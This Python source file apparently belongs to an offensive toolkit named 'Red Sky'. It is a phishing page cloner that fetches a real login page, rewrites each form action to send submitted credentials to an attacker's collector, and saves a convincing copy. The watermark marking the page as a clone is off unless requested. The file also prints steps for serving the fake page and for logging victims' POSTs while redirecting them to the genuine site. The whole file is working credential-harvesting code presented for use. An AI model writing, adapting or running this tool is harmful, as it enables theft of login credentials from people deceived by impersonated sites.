# language: Python, file: Program/phishing/template.py, target: Red Sky phishing — page cloner
# Fetches a target login page, rewrites form actions + asset URLs to point at
# our collector, and writes a drop-in replacement into Output/phishing/sites/.

import json
import re
import sys
import time
from pathlib import Path
from typing import Dict, List
from urllib.parse import urljoin, urlparse

import requests

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


PH_DIR = OUTPUT_DIR / "phishing"
SITES_DIR = PH_DIR / "sites"
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"


# form action rewrite — any <form action="..."> becomes our collector endpoint
FORM_RE = re.compile(r'(<form[^>]*\baction\s*=\s*)(["\'])([^"\']*)(["\'])', re.IGNORECASE)
# input name preservation — nothing to do here, but captured in the log
# absolute URL rewrite for CSS/JS/img — leave alone by default (they load from origin)
# but if we want fully offline, add --offline flag and we rewrite to ./assets/


def fetch(url: str, timeout: int = 15) -> str:
    r = requests.get(url, timeout=timeout, headers={"User-Agent": UA}, allow_redirects=True)
    r.raise_for_status()
    return r.text


def rewrite_forms(html: str, collector_path: str) -> tuple:
    """Returns (new_html, count_rewritten)."""
    count = [0]
    def _repl(m):
        count[0] += 1
        pre, q1, _action, q2 = m.group(1), m.group(2), m.group(3), m.group(4)
        return pre + q1 + collector_path + q2
    new_html = FORM_RE.sub(_repl, html)
    return new_html, count[0]


def inject_banner(html: str, label: str) -> str:
    """Optional visible marker so you know it's your copy, not the real site.
    Removed by default — use --mark to include."""
    banner = (
        '<div style="position:fixed;bottom:0;right:0;background:#8b0000;color:#fff;'
        'font:11px monospace;padding:4px 8px;z-index:99999;opacity:.85">'
        + label +
        '</div>'
    )
    if "</body>" in html.lower():
        idx = html.lower().rfind("</body>")
        return html[:idx] + banner + html[idx:]
    return html + banner


def cmd_clone(url: str, name: str, collector_path: str, mark: bool, out_dir: str = "") -> int:
    PH_DIR.mkdir(parents=True, exist_ok=True)
    SITES_DIR.mkdir(parents=True, exist_ok=True)
    target = Path(out_dir) if out_dir else SITES_DIR / name
    target.mkdir(parents=True, exist_ok=True)

    print_info("cloning " + url)
    print_kv("name", name)
    print_kv("collector", collector_path)

    try:
        html = fetch(url)
    except Exception as e:
        print_err("fetch failed: " + str(e))
        return 1

    print_kv("bytes in", len(html))

    rewritten, count = rewrite_forms(html, collector_path)
    print_kv("forms rewritten", count)
    if count == 0:
        print_warn("no <form action=...> found — check the page or add JS-based capture")

    if mark:
        rewritten = inject_banner(rewritten, "clone // " + name)

    (target / "index.html").write_text(rewritten, encoding="utf-8")

    # write a small metadata file so the collector knows what this clone targets
    meta = {
        "name": name,
        "source_url": url,
        "collector_path": collector_path,
        "cloned_at": int(time.time()),
        "forms_rewritten": count,
    }
    (target / "meta.json").write_text(json.dumps(meta, indent=2))

    # rewrite external asset links to preserve origin paths (relative won't work from disk)
    print()
    print_ok("clone written to " + str(target))
    print()
    print_info("serve it with:  python3 -m http.server 8000 --directory " + str(target))
    print_info("collector at:   " + collector_path)
    print()
    print_info("next: run `redsky phishing collector --port 8080 --redirect " + url + "` to log POSTs")

    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky phishing template", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("url", nargs="?", default="")
    p.add_argument("--name", default="")
    p.add_argument("--collector-path", default="/collect")
    p.add_argument("--mark", action="store_true", help="inject a visible watermark")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky phishing template <url> [--name X] [--collector-path /collect] [--mark]")
        return 2

    if ns.help:
        print_info("redsky phishing template https://example.com/login --name exampl_login")
        print_info("  fetches the page, rewrites every <form action> to your collector path")
        return 0

    if not ns.url:
        print_err("provide a URL to clone")
        return 2

    name = ns.name or (urlparse(ns.url).netloc + urlparse(ns.url).path).replace("/", "_").strip("_") or "clone"
    return cmd_clone(ns.url, name, ns.collector_path, ns.mark, ns.out)


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
